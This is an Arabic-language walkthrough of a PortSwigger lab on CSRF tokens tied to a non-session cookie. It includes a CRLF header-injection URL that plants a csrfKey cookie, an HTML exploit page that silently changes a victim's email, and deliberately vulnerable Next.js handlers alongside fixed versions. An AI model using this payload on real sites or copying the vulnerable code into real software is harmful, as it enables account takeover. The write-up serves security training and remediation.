# Lab: CSRF where token is tied to non-session cookie

> **Category:** CSRF  
> **Difficulty:** PRACTITIONER  
> **Lab Link:** [PortSwigger Lab - CSRF where token is tied to non-session cookie](https://portswigger.net/web-security/csrf/lab-token-tied-to-non-session-cookie)

---

## 🎯 الهدف الرئيسي

استغلال ثغرة CSRF في وظيفة تغيير البريد الإلكتروني. الموقع يربط CSRF Token بـ **كوكي غير مربوط بالجلسة** (non-session cookie). يمكننا حقن هذه الكوكي في متصفح الضحية باستخدام ثغرة أخرى (Cookie Injection) ثم تنفيذ هجوم CSRF.

---

## 📝 الحل خطوة بخطوة

### الخطوة 1: فهم آلية التحقق

لدينا حسابين:
- `wiener:peter`
- `carlos:montoya`

عند تغيير البريد، يظهر طلب مثل هذا:

```http
POST /my-account/change-email HTTP/1.1
Cookie: session=SESSION_ID; csrfKey=CSRF_KEY_VALUE

email=test@test.com&csrf=TOKEN_VALUE
```

**الملاحظة:** التوكن (`csrf`) مربوط بكوكي `csrfKey` وليس بالجلسة.

### الخطوة 2: اختبار عدم ارتباط التوكن بالجلسة

- سجل الدخول بـ `wiener`
- غيّر قيمة `session` كوكي → تسجل خروج ✅
- غيّر قيمة `csrfKey` كوكي → يتم رفض التوكن ❌

هذا يعني أن `csrfKey` هو المهم للتحقق.

### الخطوة 3: أخذ csrfKey و csrf من حساب wiener

- سجل الدخول بـ `wiener`
- أرسل طلب تغيير بريد واعترضه
- سجل قيم:
  - `csrfKey=WIENER_CSRF_KEY`
  - `csrf=WIENER_TOKEN`

### الخطوة 4: اختبار نقل التوكن إلى حساب carlos

- افتح نافذة خاصة (Incognito)
- سجل الدخول بـ `carlos`
- في Repeater، استبدل:
  - كوكي `csrfKey` بقيمة wiener
  - معامل `csrf` بقيمة wiener
- الطلب ينجح! ✅ يعني التوكن يعمل عبر الحسابات.

### الخطوة 5: إيجاد طريقة لحقن كوكي csrfKey في متصفح الضحية

نلاحظ أن خاصية **البحث (Search)** تعكس المدخلات في `Set-Cookie`:

```http
GET /?search=test HTTP/1.1
```

الرد يحتوي على:
```
Set-Cookie: search=test; SameSite=None
```

نستغل هذا لحقن كوكي `csrfKey`:

```
/?search=test%0d%0aSet-Cookie:%20csrfKey=WIENER_CSRF_KEY%3b%20SameSite=None
```

### الخطوة 6: إنشاء HTML للهجوم

سنقوم بـ:
1. حقن كوكي `csrfKey` باستخدام ثغرة البحث
2. ثم تنفيذ طلب تغيير البريد باستخدام التوكن المناسب

```html
<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=WIENER_CSRF_KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">

<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="carlos%40attacker.net">
    <input type="hidden" name="csrf" value="WIENER_TOKEN">
</form>

<script>
    // الصورة تحقن الكوكي، ثم عند فشلها (onerror) يتم إرسال الفورم
</script>
```

### الخطوة 7: رفع الهجوم إلى Exploit Server

- اضغط **Go to exploit server**
- في حقل **Body**، الصق الـ HTML
- اضغط **Store**

### الخطوة 8: تسليم الهجوم للضحية

- اضغط **Deliver to victim**
- تم حل المختبر ✅

---

## ملاحظات

| النقطة | الشرح |
|--------|-------|
| **ما هي non-session cookie؟** | كوكي غير مربوط بجلسة المستخدم (مثل `csrfKey`) |
| **كيف حقنّا الكوكي؟** | باستخدام ثغرة البحث التي تعكس المدخلات في `Set-Cookie` |
| **لماذا استخدمنا `onerror`؟** | الصورة تحاول التحميل، تفشل ثم ت send الفورم |
| **ماذا يفعل `%0d%0a`؟** | سطر جديد (CRLF) يسمح بحقن هيدرات جديدة |

---

## 🛡️ Remediation & Source Code Fix

### 📌 Vulnerability Root Cause

1. CSRF Token مربوط بكوكي غير مربوط بالجلسة
2. وجود ثغرة **CRLF Injection** في وظيفة البحث تسمح بحقن كوكي

---

### ❌ Non-Compliant Code (Next.js)

```javascript
// وظيفة البحث - فيها CRLF Injection
export default function searchHandler(req, res) {
  const { search } = req.query;
  // خطير: يعكس المدخلات مباشرة في Set-Cookie
  res.setHeader('Set-Cookie', `search=${search}; SameSite=None`);
  res.send(`Search results for: ${search}`);
}

// وظيفة تغيير البريد - CSRF token مربوط بـ csrfKey cookie
export default function emailHandler(req, res) {
  const { email, csrf } = req.body;
  const { sessionId, csrfKey } = req.cookies;
  
  // خطأ: يتحقق أن csrf يطابق csrfKey فقط
  if (getCsrfToken(csrfKey) !== csrf) {
    return res.status(403).send('Invalid CSRF token');
  }
  
  const user = getUserBySession(sessionId);
  updateUserEmail(user.id, email);
  res.send('Email updated');
}
```

---

### ✅ Compliant Code (Next.js)

```javascript
// وظيفة البحث - إصلاح CRLF Injection
export default function searchHandler(req, res) {
  let { search } = req.query;
  
  // إزالة أي أحرف خطيرة مثل CRLF
  search = search.replace(/[\r\n]/g, '');
  
  // استخدام encoding آمن
  const safeSearch = encodeURIComponent(search);
  res.setHeader('Set-Cookie', `search=${safeSearch}; SameSite=None`);
  res.send(`Search results for: ${escapeHtml(search)}`);
}

// وظيفة تغيير البريد - إصلاح: ربط التوكن بالجلسة
const sessionTokens = new Map(); // sessionId -> token

export default function emailHandler(req, res) {
  const { email, csrf } = req.body;
  const { sessionId } = req.cookies;
  
  // التحقق من أن التوكن يخص هذه الجلسة
  const expectedToken = sessionTokens.get(sessionId);
  if (!expectedToken || expectedToken !== csrf) {
    return res.status(403).send('Invalid CSRF token');
  }
  
  sessionTokens.delete(sessionId); // single-use
  
  const user = getUserBySession(sessionId);
  updateUserEmail(user.id, email);
  res.send('Email updated');
}
```

**الخلاصة:** 
1. لا تثق في كوكي غير مربوط بالجلسة للتحقق من CSRF
2. امنع CRLF Injection في أي مكان يعكس مدخلات المستخدم

---

## 🛡️ كيفية الوقاية (How to Prevent)

1. **ربط التوكن بالجلسة:** استخدم `sessionId` لتخزين التوكن.
2. **منع CRLF Injection:** ارفض أو قم بتشفير `\r` و `\n`.
3. **استخدام `HttpOnly` للكوكيز:** لمنع سرقتها عبر XSS.
4. **استخدام SameSite=Lax:** للحماية من CSRF.

---

## 🔗 روابط مفيدة

- [PortSwigger Lab Page](https://portswigger.net/web-security/csrf/lab-token-tied-to-non-session-cookie)
- [CSRF Cheat Sheet](https://portswigger.net/web-security/csrf)
- [CRLF Injection](https://portswigger.net/web-security/crlf-injection)
